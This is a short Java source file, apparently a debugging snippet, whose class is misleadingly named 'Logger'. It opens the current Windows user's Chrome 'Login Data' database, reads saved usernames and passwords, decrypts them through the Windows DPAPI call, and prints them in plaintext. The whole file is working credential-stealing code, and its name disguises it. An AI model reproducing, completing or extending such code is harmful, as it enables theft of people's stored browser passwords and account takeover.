import java.sql.Statement;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;

import com.sun.jna.platform.win32.Crypt32Util;

public class Logger{
		public Logger(){
			try{
		    Class.forName("org.sqlite.JDBC");
		    String user = System.getProperty("user.name");
			Connection connection = DriverManager.getConnection("jdbc:sqlite:C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data");
			Statement statement = connection.createStatement();
			ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
		    while (resultSet.next())
		    {
		        byte[] encryptedData = resultSet.getBytes(2);
		        byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);  // exception over here
	
		        StringBuilder decryptedString = new StringBuilder();
	
		        for (byte b : decryptedData)
		        {
		           decryptedString.append((char) b);
		        }
	
		        System.out.println("decrypted = [" + decryptedString + "]");
		   }
		   connection.close();
		 }catch(Exception e)
		 {
		    e.printStackTrace();
		 } 
	}
}